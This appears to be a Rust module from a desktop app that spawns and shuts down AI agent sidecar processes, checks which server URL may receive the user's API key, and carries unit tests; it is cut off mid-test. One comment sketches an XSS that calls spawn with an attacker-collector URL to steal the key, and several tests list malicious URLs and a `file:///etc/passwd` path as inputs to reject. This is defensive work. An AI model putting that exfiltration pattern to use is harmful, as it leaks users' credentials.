//! The agent sessions: one engine process per session of a window (`Sidecars`), started by
//! `spawn` with the fence, the account and the Run's flags, fed by `send`, and ended politely
//! before it is killed (`encerrar_com_prazo`). A window that reloads or closes ends all of its
//! agents. Split out of `code_bridge.rs` in 1.6.41; several sessions per window since 1.8.0.

use super::*;

/// One engine process of one session of a window. `gen` is the session's generation: the
/// stdout thread uses it to know whether it is still the live session under its key.
pub(super) struct Sidecar {
    child: Child,
    stdin: ChildStdin,
    gen: u64,
}

/// How long an engine gets to leave on its own before it is killed (1.6.29).
pub(super) const PRAZO_PARA_SAIR: std::time::Duration = std::time::Duration::from_secs(2);

/// Ends a sidecar the way a person would: ask, wait, then force (1.6.29).
///
/// `child.kill()` alone is SIGKILL on Unix (TerminateProcess on Windows): the engine got no
/// chance to run its exit path, so the Claude SDK's cleanup of the `claude` CLI it spawned
/// (`process.on("exit")`), the Codex runner's `encerrar` (which kills `codex app-server`), and a
/// running tool (`npm run dev`, `cargo test`) were skipped — orphans holding ports and locks.
/// Every engine leaves on `{"type":"exit"}` or on stdin EOF: this sends the first, closes stdin,
/// polls for `prazo`, and only then kills.
pub(super) fn encerrar_com_prazo(sc: Sidecar, prazo: std::time::Duration) {
    encerrar_varios_com_prazo(vec![sc], prazo);
}

/// The same for several at once, under ONE deadline (the app's exit must not wait 2 s each).
pub(super) fn encerrar_varios_com_prazo(varios: Vec<Sidecar>, prazo: std::time::Duration) {
    let mut filhos: Vec<Child> = varios
        .into_iter()
        .map(|sc| {
            let Sidecar { child, mut stdin, .. } = sc;
            let _ = writeln!(stdin, r#"{{"type":"exit"}}"#);
            let _ = stdin.flush();
            drop(stdin); // EOF, for an engine that only watches stdin
            child
        })
        .collect();
    let inicio = std::time::Instant::now();
    while inicio.elapsed() < prazo {
        filhos.retain_mut(|c| !matches!(c.try_wait(), Ok(Some(_))));
        if filhos.is_empty() {
            return;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }
    for mut c in filhos {
        let _ = c.kill();
        let _ = c.wait();
    }
}

/// Most sessions one window may hold at once (1.8.0). Each one is an engine process, and the
/// Claude runner starts a `claude` CLI of its own: a page that spawned in a loop, from a bug or
/// from a hostile script, would otherwise fill the machine. Eight is several projects working
/// at the same time, which is the point of 1.8.0, and far from what a person drives.
pub(super) const MAX_SESSOES_POR_JANELA: usize = 8;

/// The key of one agent session in `Sidecars`: the window, plus the session the page names.
///
/// Until 1.7.1 a window held ONE session, keyed by its label, so switching project in Code mode
/// had to kill the agent that was working. Since 1.8.0 the page names each session (one per
/// project) and they live side by side. An empty `sessao` is the key of before, byte for byte:
/// a page that does not know `recursos.sessoes` never sends one, and gets exactly the old
/// single-session behaviour.
///
/// The separator is U+001F (unit separator). `sessao_valida` keeps it out of any session name,
/// so no pair of (label, sessao) can collide with another.
pub(super) fn chave(label: &str, sessao: &str) -> String {
    if sessao.is_empty() {
        label.to_string()
    } else {
        format!("{label}\u{1f}{sessao}")
    }
}

/// Is this key one of `label`'s sessions (the legacy one or a named one)?
fn da_janela(chave: &str, label: &str) -> bool {
    chave == label || chave.strip_prefix(label).is_some_and(|resto| resto.starts_with('\u{1f}'))
}

/// A session name comes from the PAGE, so it is untrusted input that becomes a map key and an
/// event tag. Short, and only `[A-Za-z0-9_.:-]`: enough for "p42" or a UUID, and nothing that
/// could break the key's separator or the `_emit` string.
pub(super) fn sessao_valida(sessao: &str) -> bool {
    sessao.len() <= 64 && sessao.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | ':' | '-'))
}

/// Registro de sidecars por sessão de janela (`chave`) — em Tauri managed state.
/// Cada entrada fica em `Option<Sidecar>` para que `send_line` consiga TIRAR
/// o sidecar do mapa sob o lock, escrever no stdin FORA do lock (o pipe pode
/// bloquear se o anna estiver ocupado), e devolver a entrada no lock de novo.
#[derive(Default)]
pub struct Sidecars {
    map: Mutex<HashMap<String, Option<Sidecar>>>,
    next_gen: AtomicU64,
}

impl Sidecars {
    /// Ends ONE session (the page's "Parar", "Novo chat", a new engine for that project).
    pub(super) fn kill_sessao(&self, chave: &str) {
        // Remove sob o lock, mas mata/espera FORA dele — child.wait() pode bloquear
        // e seguraria o Mutex global (send/insert de outras janelas travariam).
        let sc = self
            .map
            .lock()
            .ok()
            .and_then(|mut m| m.remove(chave))
            .and_then(|opt| opt);
        // Off the calling thread: this runs on "Parar" on the UI thread, and the engine gets up
        // to PRAZO_PARA_SAIR to leave on its own.
        if let Some(sc) = sc {
            std::thread::spawn(move || encerrar_com_prazo(sc, PRAZO_PARA_SAIR));
        }
    }

    /// Ends EVERY session of one window: it closed, or a new document started in it (reload).
    /// Nothing re-attaches to a running engine, so a session the page can no longer see is an
    /// agent with no owner.
    pub fn kill_one(&self, label: &str) {
        let varios: Vec<Sidecar> = self
            .map
            .lock()
            .ok()
            .map(|mut m| {
                let chaves: Vec<String> = m.keys().filter(|k| da_janela(k, label)).cloned().collect();
                chaves.into_iter().filter_map(|k| m.remove(&k).flatten()).collect()
            })
            .unwrap_or_default();
        if !varios.is_empty() {
            std::thread::spawn(move || encerrar_varios_com_prazo(varios, PRAZO_PARA_SAIR));
        }
    }

    /// How many sessions this window holds (the ones being created included).
    pub(super) fn sessoes_da_janela(&self, label: &str) -> usize {
        self.map.lock().map(|m| m.keys().filter(|k| da_janela(k, label)).count()).unwrap_or(0)
    }

    /// Is `chave` a session that exists right now (running or being created)?
    pub(super) fn existe(&self, chave: &str) -> bool {
        self.map.lock().map(|m| m.contains_key(chave)).unwrap_or(false)
    }

    /// May session `chave` start in window `label`? A respawn (the key exists) always may,
    /// because it replaces the one it had; only a NEW session counts against
    /// `MAX_SESSOES_POR_JANELA`.
    pub(super) fn cabe(&self, label: &str, chave: &str) -> bool {
        self.existe(chave) || self.sessoes_da_janela(label) < MAX_SESSOES_POR_JANELA
    }

    /// Há sessão do Code viva nesta janela? (qualquer uma, desde 1.8.0)
    ///
    /// Existe para o guard de fechamento (`decidir_fechar`): fechar com `anna` no ar
    /// perde a sessão **e** deixa o processo órfão. Medido em 20/08/2026 nesta máquina:
    /// **dois** `anna` vivos e um `shvia-desktop` zumbi desde 06/08 — órfão não é
    /// hipótese, é o estado atual.
    ///
    /// `Some(None)` no mapa é sessão em criação (o slot é reservado antes do spawn), e
    /// conta como viva de propósito: perguntar de graça é barato, fechar por cima de um
    /// spawn em curso deixa exatamente o órfão que este guard existe para evitar.
    pub fn tem_sessao(&self, label: &str) -> bool {
        self.sessoes_da_janela(label) > 0
    }

    /// Mata todos (saída do app — anti-órfão).
    pub fn kill_all(&self) {
        let drained: Vec<Sidecar> = self
            .map
            .lock()
            .ok()
            .map(|mut m| {
                m.drain()
                    .filter_map(|(_, opt)| opt)
                    .collect()
            })
            .unwrap_or_default();
        // At app exit, synchronously: a thread would die with the process. One shared
        // deadline for all of them.
        encerrar_varios_com_prazo(drained, PRAZO_PARA_SAIR);
    }

    /// Registra o sidecar da sessão (nova geração), matando o anterior da MESMA chave
    /// (respawn). Devolve a geração desta sessão.
    fn insert(&self, chave: String, child: Child, stdin: ChildStdin) -> u64 {
        let gen = self.next_gen.fetch_add(1, Ordering::Relaxed) + 1;
        let old = self.map.lock().ok().and_then(|mut m| {
            m.insert(
                chave,
                Some(Sidecar {
                    child,
                    stdin,
                    gen,
                }),
            )
        });
        if let Some(Some(old)) = old {
            std::thread::spawn(move || encerrar_com_prazo(old, PRAZO_PARA_SAIR));
        }
        gen
    }

    /// Colhe o sidecar desta geração e devolve o **código de saída** dele.
    ///
    /// `None` = esta geração já não é a sessão viva (respawn ou kill), e nesse caso o
    /// chamador não deve sinalizar nada — é a mesma guarda que o `is_current` fazia.
    /// `Some(None)` = era a sessão viva, mas o código não pôde ser lido.
    ///
    /// 🔴 Existe porque o `exited` era mudo. A ponte descobria a morte pelo stdout
    /// fechando e emitia `{type:'exited'}` sem mais nada — o que serve enquanto todo
    /// motor morre por um motivo só. O `codex-runner` morre por DOIS: acabou, ou
    /// recusou subir porque o sandbox não segurou. Sem o código, a tela conta os dois
    /// como a mesma coisa, e o segundo é justamente o que o usuário precisa ler.
    ///
    /// Remove sob o lock e espera FORA dele, pela mesma razão do `kill_sessao`:
    /// `wait()` pode bloquear e seguraria o Mutex global.
    fn colher(&self, chave: &str, gen: u64) -> Option<Option<i32>> {
        let sc = {
            let mut m = self.map.lock().ok()?;
            match m.get(chave).and_then(|opt| opt.as_ref()) {
                Some(sc) if sc.gen == gen => m.remove(chave).and_then(|opt| opt),
                _ => return None,
            }
        };
        let mut sc = sc?;
        Some(sc.child.wait().ok().and_then(|st| st.code()))
    }

    /// Escreve uma linha no stdin do sidecar da sessão (mensagem ou decisão).
    /// `false` = não havia sessão viva ou a escrita falhou (o host então sabe que
    /// a decisão/mensagem caiu, em vez de assumir ok).
    ///
    /// Importante: o `writeln!+flush` acontece FORA do Mutex global — se o pipe
    /// do anna encher (tool longa, gate bloqueante), só esta chamada trava;
    /// outras janelas e o spawn/kill continuam funcionando.
    fn send_line(&self, chave: &str, line: &str) -> bool {
        let mut sidecar = match self.map.lock() {
            Ok(mut map) => match map.get_mut(chave) {
                Some(slot) => slot.take(),
                None => None,
            },
            Err(_) => None,
        };
        let Some(mut sc) = sidecar.take() else {
            return false;
        };
        let ok = writeln!(sc.stdin, "{line}").and_then(|_| sc.stdin.flush()).is_ok();
        if let Ok(mut map) = self.map.lock() {
            if let Some(slot) = map.get_mut(chave) {
                *slot = Some(sc);
            }
            // Se a janela foi removida entre os dois locks, recria sem gravar
            // de volta (a sessão está morta). Sem leak: o Child morre no drop.
        }
        ok
    }
}

/// `true` se `url` for um endereço https de um host do servidor do ShvIA
/// (`crate::SERVER_HOSTS`). Usada para validar o campo `url` que a PÁGINA manda no
/// `spawn` — a mesma allowlist exata de `is_internal` e de
/// `windows_ipc::ALLOWED_MESSAGE_ORIGINS`, para o perímetro ter uma resposta só.
///
/// Compara HOST parseado, nunca prefixo de string: `starts_with` deixaria passar
/// `https://ai.shvia.org.atacante.tld`, que é outro domínio.
pub(super) fn url_do_servidor(url: &str) -> bool {
    match url.parse::<tauri::Url>() {
        Ok(u) => u.scheme() == "https" && u.host_str().is_some_and(crate::is_server_host),
        Err(_) => false,
    }
}

/// The Run's flags for the Claude runner (RUN-20260910, B3), from the `autonomy` object
/// the page sends in `spawn`: `{stopByHost: bool, maxIterations: n, maxCostUsd: x}`.
///
/// Absent object → no flag, and the runner behaves as before 1.5.0: it never emits
/// `stop_request` and sets no cap. Presence, not a version number, is the gate — the
/// `recursos.run` flag in the shim is how the page learns this shell knows the field.
///
/// A value that is not a positive number is DROPPED, never coerced: a cap of 0 would end
/// every turn before it started, and the runner refuses it the same way (`parada.mjs`).
/// Two guards agreeing is not redundancy here — the flag crosses a process boundary, and
/// each side reads its own input.
pub(super) fn argumentos_da_run(autonomy: Option<&serde_json::Value>) -> Vec<String> {
    let mut args: Vec<String> = Vec::new();
    let Some(a) = autonomy.filter(|a| a.is_object()) else {
        return args;
    };
    if a.get("stopByHost").and_then(|x| x.as_bool()).unwrap_or(false) {
        args.push("--parada".into());
        args.push("host".into());
    }
    if let Some(n) = a
        .get("maxIterations")
        .and_then(|x| x.as_f64())
        .filter(|n| n.is_finite() && *n >= 1.0)
    {
        args.push("--teto-iteracoes".into());
        args.push((n.floor() as u64).to_string());
    }
    if let Some(c) = a
        .get("maxCostUsd")
        .and_then(|x| x.as_f64())
        .filter(|c| c.is_finite() && *c > 0.0)
    {
        args.push("--teto-custo".into());
        args.push(format!("{c}"));
    }
    args
}

/// The session a `spawn`/`send`/`kill` names, from the page's `sessao` field. `Ok("")` = none
/// (the single session of before 1.8.0); `Err` = a name `sessao_valida` refuses.
pub(super) fn sessao_do_pedido(v: &serde_json::Value) -> Result<String, ()> {
    let sessao = v.get("sessao").and_then(|x| x.as_str()).unwrap_or_default();
    if sessao_valida(sessao) {
        Ok(sessao.to_string())
    } else {
        Err(())
    }
}

pub(super) fn spawn(window: &WebviewWindow, req: &str, v: &serde_json::Value) {
    let s = |k: &str| v.get(k).and_then(|x| x.as_str()).unwrap_or_default().to_string();
    let Ok(sessao) = sessao_do_pedido(v) else {
        return reply(window, req, false, serde_json::json!({ "error": "nome de sessão inválido", "codigo": "sessao_invalida" }));
    };
    let chave_sessao = chave(window.label(), &sessao);
    if !window.app_handle().state::<Sidecars>().cabe(window.label(), &chave_sessao) {
        return reply(window, req, false, serde_json::json!({
            "error": format!("já há {MAX_SESSOES_POR_JANELA} agentes trabalhando nesta janela — pare um antes de começar outro"),
            "codigo": "sessoes_demais",
        }));
    }
    let dir = s("projectDir");
    if dir.is_empty() || !PathBuf::from(&dir).is_dir() {
        return reply(window, req, false, serde_json::json!({ "error": "pasta do projeto inválida" }));
    }
    // A cerca (F-12) vale para o agente também: o `projectDir` é onde ele vai LER e ESCREVER
    // por horas. Deixar a página escolher a raiz do agente seria a mesma porta do `readFile`,
    // com muito mais alcance — o gate do próprio `anna` confina na raiz que recebe daqui.
    if !pasta_autorizada(window, &dir) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "pasta não autorizada — escolha a pasta do projeto pelo botão do app" }),
        );
    }
    // Motor: "gateway" (anna, default) ou "claude" (claude-runner — Claude Code
    // com a ASSINATURA do usuário, FORA do gateway). Ambos falam o mesmo NDJSON
    // (embedding.md), então o bridge e a UI de cards não mudam. Sem `engine` = anna.
    let engine = s("engine");
    let is_claude = engine == "claude";
    let (exe_base, erro_ausente, cod_ausente) = motor_do_engine(&engine);
    // This runs on the UI thread, so it refuses instead of waiting: a session started while the
    // installer rewrites the runner's folder would load half the files (1.7.1).
    if super::atualizacao::instalando(exe_base) {
        return reply(window, req, false, serde_json::json!({
            "error": "o runner deste motor está sendo atualizado junto com o app — tente de novo em alguns segundos",
            "codigo": "runner_atualizando",
        }));
    }
    let Some(lancamento) = resolve_runner(exe_base) else {
        return reply(window, req, false,
            serde_json::json!({ "error": erro_ausente, "codigo": cod_ausente }));
    };

    // On Windows a runner is `node <runner>.mjs` (see `Lancamento`); the rest is unchanged.
    let mut cmd = lancamento.comando();
    cmd.current_dir(&dir);
    // App de GUI não herda o PATH do shell (ADR-029): sem isto o agente não
    // encontra npx/node/cargo/php e fica insistindo em comando que não existe.
    if let Some(p) = crate::user_env::sidecar_path() {
        cmd.env("PATH", p);
    }
    let (model, effort, url, key) = (s("model"), s("effort"), s("url"), s("apiKey"));

    // `url` vem da PÁGINA e viaja junto com SHVIA_API_KEY (a chave do usuário) —
    // então é entrada não confiável no caminho de um segredo, e passa pela MESMA
    // allowlist do resto do perímetro (`crate::SERVER_HOSTS`). Sem esta checagem,
    // um XSS na página do ShvIA — ou um asset de terceiro comprometido; a CSP do
    // web nasce DESLIGADA (SHVIA-WEB/config/security.php) — chamaria
    // `__shviaCode.spawn({url:'https://coletor.atacante.tld', apiKey:'…'})` e o
    // agente mandaria a chave em `X-API-Key` para lá. O anna só exige https, e
    // https qualquer atacante tem.
    //
    // Rejeitar é seguro para o uso legítimo: o web manda `location.origin`
    // (code-mode.js), e uma página que roda num host do servidor tem, por
    // definição, origem que passa. Falha ALTO em vez de cair no default
    // compilado — silenciar mandaria o turno para o host errado sem sintoma.
    if !url.is_empty() && !url_do_servidor(&url) {
        return reply(
            window,
            req,
            false,
            serde_json::json!({ "error": "url de servidor não autorizada" }),
        );
    }
    // Conta resolvida, para a resposta ecoar o que de fato valeu. Só o motor Claude tem
    // conta; no `anna` fica `None` e o campo não sai.
    let mut resolvida: Option<(String, String)> = None;
    if is_claude {
        // Assinatura via cliente oficial: NADA de SHVIA_API_KEY nem `--url` — este
        // motor não passa pelo gateway, então chave e endpoint do ShvIA não se
        // aplicam e mandá-los seria vazar credencial para fora do perímetro dele.
        //
        // `--model` e `--effort` SIM (21/08) — mas **só quando a página garante
        // que vieram do catálogo do Claude**, via `modelDoClaude: true`.
        //
        // Sem essa trava a correção viraria regressão: até agora o modelo era
        // lido e descartado aqui, então a UI mandando `openai/gpt-5.6-sol` (o
        // catálogo do GATEWAY, que é o que ela ainda mostra com o motor Claude
        // ativo) não fazia mal nenhum. Repassar sem conferir trocaria "seletor que
        // não faz nada" por "sessão que não abre" — pior, porque quebra o que
        // funcionava.
        //
        // A trava é declarativa de propósito: nada de adivinhar pela forma do id
        // (`contém '/'`?), que erraria no primeiro alias novo. Quem sabe de qual
        // catálogo o valor saiu é quem montou o seletor, e ela diz.
        cmd.args(["--cwd", &dir]);
        // Conta de assinatura (ADR-033). A página manda um `accountId` da lista; quem o
        // traduz em `CLAUDE_CONFIG_DIR` é o `contas_claude::resolver` — o MESMO que o
        // `claudeModels` usa, para descoberta e turno não poderem divergir de conta.
        //
        // 🔴 Falha ALTO, sem fallback. Cair na conta padrão quando o id não resolve seria
        // rodar o turno numa assinatura que o usuário não escolheu, com a tela mostrando o
        // nome da que ele escolheu — e sob assinatura isso gasta a cota da conta errada.
        // Um erro na hora é barato; a sessão silenciosa na conta errada não é.
        let (contas, _) = crate::contas_claude::registro(window.app_handle());
        let account_id = v.get("accountId").and_then(|x| x.as_str()).unwrap_or_default();
        let conta_dir = match crate::contas_claude::resolver(&contas, account_id) {
            Ok(d) => d,
            Err(e) => {
                return reply(
                    window,
                    req,
                    false,
                    serde_json::json!({ "error": e.mensagem(), "codigo": e.codigo() }),
                )
            }
        };
        crate::contas_claude::aplicar(&mut cmd, conta_dir.as_ref());
        resolvida = contas
            .iter()
            .find(|c| c.id == if account_id.trim().is_empty() { crate::contas_claude::PADRAO } else { account_id.trim() })
            .map(|c| (c.id.clone(), c.rotulo.clone()));
        let do_claude = v.get("modelDoClaude").and_then(|x| x.as_bool()).unwrap_or(false);
        if do_claude && !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if do_claude && !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        // Aprovação NÃO depende de `modelDoClaude`: os níveis são os mesmos dos
        // dois motores (manual/edit/auto), implementados por código nosso — o
        // hook `PreToolUse` do runner, que é quem faz o cartão de aprovação
        // aparecer. Não há catálogo a conciliar aqui, então o valor passa direto.
        let aprovacao = s("approval");
        if !aprovacao.is_empty() {
            cmd.args(["--aprovacao", &aprovacao]);
        }
        // A Run (RUN-20260910, B3): the page arms the stop handshake and the caps. Only
        // the Claude runner knows these flags today; `anna` and the Codex runner continue
        // between turns, from the page, and receive nothing here.
        for a in argumentos_da_run(v.get("autonomy")) {
            cmd.arg(a);
        }
    } else if engine == "codex" {
        if !v.get("modelDoCodex").and_then(|x| x.as_bool()).unwrap_or(false) || model.is_empty() {
            return reply(
                window,
                req,
                false,
                serde_json::json!({ "error": "Carregue o catálogo do Codex antes de enviar." }),
            );
        }
        cmd.args(["--cwd", &dir, "--model", &model]);
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
    } else {
        cmd.arg("--json").args(["--tools", "local"]);
        if !model.is_empty() {
            cmd.args(["--model", &model]);
        }
        if !effort.is_empty() {
            cmd.args(["--effort", &effort]);
        }
        if !url.is_empty() {
            cmd.args(["--url", &url]);
        }
        if !key.is_empty() {
            cmd.env("SHVIA_API_KEY", &key); // chave do usuário, repassada pelo web (nunca logada)
        }
    }
    cmd.stdin(Stdio::piped()).stdout(Stdio::piped()).stderr(Stdio::piped());

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        // `exe_base`, não "anna" cravado: com o motor Claude ativo a frase nomeava o outro
        // binário, e esta é exatamente a mensagem que aparece quando um perfil de conta não
        // sobe (ADR-033). Mandar quem procura o defeito olhar o motor errado custa a sessão
        // inteira de diagnóstico.
        Err(e) => {
            return reply(
                window,
                req,
                false,
                serde_json::json!({ "error": format!("falha ao iniciar {exe_base}: {e}") }),
            )
        }
    };
    let stdout = child.stdout.take().expect("stdout piped");
    let stderr = child.stderr.take().expect("stderr piped");
    let stdin = child.stdin.take().expect("stdin piped");

    // Guarda no state, matando um sidecar anterior da MESMA sessão (respawn). As outras
    // sessões da janela seguem trabalhando (1.8.0). A geração desta sessão acompanha a
    // thread de stdout (guarda o 'exited').
    let gen = window.app_handle().state::<Sidecars>().insert(chave_sessao.clone(), child, stdin);
    // Every event carries the session it came from, so the page can file it under its project
    // while another one is on screen. Empty for the single session of before 1.8.0: the shim
    // then adds nothing, and an old page sees the events it always saw.
    let sessao_js = js_str(&sessao);

    // stderr → log do app (nunca a timeline).
    let tag = exe_base.to_string();
    std::thread::spawn(move || {
        for line in BufReader::new(stderr).lines().map_while(Result::ok) {
            eprintln!("[{tag}] {line}");
        }
    });

    // stdout NDJSON → evento na página (`_emit`), no main thread (WebKit).
    let win = window.clone();
    let exit_chave = chave_sessao;
    std::thread::spawn(move || {
        let app = win.app_handle().clone();
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if line.trim().is_empty() {
                continue;
            }
            let js = format!("window.__shviaCode&&window.__shviaCode._emit(JSON.parse({}),{})", js_str(&line), sessao_js);
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
        // stdout fechou → anna saiu. Só sinaliza 'exited' se ESTA geração ainda é a
        // sessão viva da chave; se foi substituída (respawn) ou morta (kill), fica
        // quieta pra não derrubar a sessão nova que acabou de subir.
        if let Some(codigo) = app.state::<Sidecars>().colher(&exit_chave, gen) {
            // O motivo vai junto do evento. `sandbox_nao_confirmado` é estado NOMEADO,
            // não "motor indisponível": o binário existe, respondeu e se recusou a
            // servir porque a garantia dele não vale nesta máquina. Tratar isso como
            // ausência mandaria reinstalar o que já está instalado.
            let motivo = match codigo {
                Some(SAIDA_SANDBOX_NAO_CONFIRMADO) => "sandbox_nao_confirmado",
                Some(0) | None => "fim",
                Some(_) => "erro",
            };
            let js = format!(
                "window.__shviaCode&&window.__shviaCode._emit({{type:'exited',reason:{},code:{}}},{})",
                js_str(motivo),
                codigo.map_or("null".to_string(), |c| c.to_string()),
                sessao_js,
            );
            let w = win.clone();
            let _ = app.run_on_main_thread(move || {
                let _ = w.eval(&js);
            });
        }
    });

    // O eco da conta resolvida fecha o laço: a página pediu um id e fica sabendo qual
    // valeu, em vez de supor que o pedido foi obedecido. Não existe evento `ready` neste
    // protocolo (os canais são `_reply`, stderr→log e stdout NDJSON→`_emit`), e inventar um
    // mudaria o `embedding.md`, que é contrato dos DOIS motores — a resposta do `spawn` é
    // o lugar que já existe para isto.
    let mut resposta = serde_json::json!({ "ok": true });
    if !sessao.is_empty() {
        resposta["sessao"] = serde_json::json!(sessao);
    }
    if let Some((id, rotulo)) = resolvida {
        resposta["accountId"] = serde_json::json!(id);
        resposta["accountLabel"] = serde_json::json!(rotulo);
    }
    reply(window, req, true, resposta);
}

pub(super) fn send(window: &WebviewWindow, v: &serde_json::Value) -> bool {
    let Ok(sessao) = sessao_do_pedido(v) else {
        return false;
    };
    let line = match v.get("payload") {
        Some(p) => serde_json::to_string(p).unwrap_or_default(),
        None => return false,
    };
    window.app_handle().state::<Sidecars>().send_line(&chave(window.label(), &sessao), &line)
}

#[cfg(test)]
mod tests_encerrar {
    #[cfg(unix)]
    use super::{encerrar_com_prazo, Sidecar};
    #[cfg(unix)]
    use std::process::Stdio;
    #[cfg(unix)]
    use std::time::{Duration, Instant};

    #[cfg(unix)]
    fn sidecar(script: &str, arg: &str) -> Sidecar {
        let mut child = crate::processo::comando("sh")
            .args(["-c", script, "sh", arg])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .spawn()
            .unwrap();
        let stdin = child.stdin.take().unwrap();
        Sidecar { child, stdin, gen: 1 }
    }

    /// 🔴 1.6.29. "Parar" was SIGKILL: the engine never ran its exit path (the SDK's cleanup of
    /// the `claude` CLI, the Codex runner killing its app-server). An engine that leaves on
    /// `{"type":"exit"}` must get that message and leave on its own, well before the deadline.
    #[cfg(unix)]
    #[test]
    fn motor_que_sabe_sair_recebe_o_pedido_e_sai_sozinho() {
        let marca = std::env::temp_dir().join(format!("shvia-saida-{}", std::process::id()));
        let _ = std::fs::remove_file(&marca);
        let sc = sidecar(r#"while read l; do case "$l" in *exit*) echo pediu > "$1"; exit 0;; esac; done"#, &marca.to_string_lossy());
        let t = Instant::now();
        encerrar_com_prazo(sc, Duration::from_secs(5));
        assert!(t.elapsed() < Duration::from_secs(3), "waited {:?} for an engine that leaves on request", t.elapsed());
        assert_eq!(std::fs::read_to_string(&marca).unwrap_or_default().trim(), "pediu", "the engine never got the exit request");
        let _ = std::fs::remove_file(&marca);
    }

    /// …and one that ignores it is still killed and reaped once the deadline passes.
    #[cfg(unix)]
    #[test]
    fn motor_que_nao_sai_morre_no_prazo() {
        let sc = sidecar("sleep 30", "");
        let pid = sc.child.id();
        let t = Instant::now();
        encerrar_com_prazo(sc, Duration::from_millis(300));
        assert!(t.elapsed() < Duration::from_secs(3), "took {:?}", t.elapsed());
        #[cfg(target_os = "linux")]
        assert!(!std::path::Path::new(&format!("/proc/{pid}")).exists(), "the stubborn engine is still alive (or a zombie)");
        let _ = pid;
    }
}

#[cfg(test)]
mod tests_url_servidor {
    use super::url_do_servidor;

    /// O caminho legítimo: o web manda `location.origin` da página do ShvIA.
    #[test]
    fn origens_do_servidor_passam() {
        assert!(url_do_servidor("https://ai.shvia.org"));
        assert!(url_do_servidor("https://ia.shvia.org"));
        assert!(url_do_servidor("https://ia.blue3.com.br"));
    }

    /// `url` viaja junto com SHVIA_API_KEY: um host de fora aqui é exfiltração da
    /// chave do usuário. Nada além do servidor entra, nem por sufixo, nem por
    /// esquema fraco, nem o ápex (que é a landing, em outro IP).
    #[test]
    fn qualquer_outra_coisa_e_rejeitada() {
        assert!(!url_do_servidor("https://coletor.atacante.tld"));
        assert!(!url_do_servidor("https://ai.shvia.org.atacante.tld"));
        assert!(!url_do_servidor("https://shvia.org"));
        assert!(!url_do_servidor("https://evil.shvia.org"));
        assert!(!url_do_servidor("http://ai.shvia.org")); // sem TLS
        assert!(!url_do_servidor("file:///etc/passwd"));
        assert!(!url_do_servidor("nao-e-url"));
        assert!(!url_do_servidor(""));
    }
}

#[cfg(test)]
mod tests_run {
    use super::*;

    /// No `autonomy` → no flag. The page of yesterday spawns exactly what it spawned.
    #[test]
    fn sem_autonomy_nenhuma_flag() {
        assert!(argumentos_da_run(None).is_empty());
        assert!(argumentos_da_run(Some(&serde_json::json!("nao-e-objeto"))).is_empty());
        assert!(argumentos_da_run(Some(&serde_json::json!({}))).is_empty());
    }

    /// The armed run becomes the three flags the runner reads (`parada.mjs`).
    #[test]
    fn a_run_armada_vira_as_tres_flags() {
        let v = serde_json::json!({ "stopByHost": true, "maxIterations": 100, "maxCostUsd": 5 });
        assert_eq!(
            argumentos_da_run(Some(&v)),
            vec!["--parada", "host", "--teto-iteracoes", "100", "--teto-custo", "5"]
        );
        // A fractional cost keeps its decimals; a fractional iteration count floors.
        let v = serde_json::json!({ "maxIterations": 2.9, "maxCostUsd": 0.5 });
        assert_eq!(argumentos_da_run(Some(&v)), vec!["--teto-iteracoes", "2", "--teto-custo", "0.5"]);
    }

    /// 🔴 An invalid cap is dropped, never coerced to 0: `maxTurns: 0` would end every
    /// turn before it started, with the screen showing a run that "ran".
    #[test]
    fn teto_invalido_nao_vira_flag() {
        let v = serde_json::json!({ "stopByHost": false, "maxIterations": 0, "maxCostUsd": -1 });
        assert!(argumentos_da_run(Some(&v)).is_empty());
        let v = serde_json::json!({ "maxIterations": "cem", "maxCostUsd": "cinco", "stopByHost": "sim" });
        assert!(argumentos_da_run(Some(&v)).is_empty());
    }
}

#[cfg(test)]
// Split out of `tests_motor` in 1.6.41.
mod tests_colher {
    use super::*;

    /// AO VIVO: o `colher` espera um processo real e devolve o código dele.
    ///
    /// Não é teste de aritmética — é a coreografia que os defeitos desta frente
    /// moraram. Um processo que sai 3 tem de chegar como `Some(Some(3))`, e uma
    /// geração que já não é a viva tem de devolver `None` (senão o respawn derruba a
    /// sessão nova que acabou de subir).
    #[test]
    fn colher_le_o_codigo_de_um_processo_de_verdade() {
        use std::process::Stdio;
        let sc = Sidecars::default();

        let mut filho = crate::processo::comando("/bin/sh")
            .args(["-c", "exit 3"])
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .spawn()
            .expect("spawn do /bin/sh");
        let stdin = filho.stdin.take().expect("stdin");
        let gen = sc.insert("janela".into(), filho, stdin);

        assert_eq!(sc.colher("janela", gen), Some(Some(3)), "não leu o código real");
        // Colhido uma vez, some do mapa: a segunda chamada não é a sessão viva.
        assert_eq!(sc.colher("janela", gen), None);
    }

    #[test]
    fn colher_de_geracao_velha_nao_sinaliza() {
        use std::process::Stdio;
        let sc = Sidecars::default();
        let mut f1 = crate::processo::comando("/bin/sh").args(["-c", "exit 0"]).stdin(Stdio::piped()).spawn().unwrap();
        let s1 = f1.stdin.take().unwrap();
        let gen_velha = sc.insert("janela".into(), f1, s1);

        let mut f2 = crate::processo::comando("/bin/sh").args(["-c", "exit 0"]).stdin(Stdio::piped()).spawn().unwrap();
        let s2 = f2.stdin.take().unwrap();
        let gen_nova = sc.insert("janela".into(), f2, s2);

        // A thread de stdout do sidecar VELHO acorda depois do respawn. Se ela
        // sinalizasse, derrubaria a sessão nova — foi para isso que a geração existe.
        assert_eq!(sc.colher("janela", gen_velha), None, "geração velha sinalizou");
        assert!(sc.colher("janela", gen_nova).is_some());
    }
}

#[cfg(test)]
// 1.8.0: several sessions per window. Every test runs real processes, because the defects
// this guards against live in the choreography (who is killed, who receives the line), not
// in arithmetic.
mod tests_sessoes {
    use super::*;
    use std::process::Stdio;

    fn processo(script: &str) -> (Child, ChildStdin) {
        let mut filho = crate::processo::comando("/bin/sh")
            .args(["-c", script])
            .stdin(Stdio::piped())
            .stdout(Stdio::null())
            .spawn()
            .expect("spawn do /bin/sh");
        let stdin = filho.stdin.take().expect("stdin");
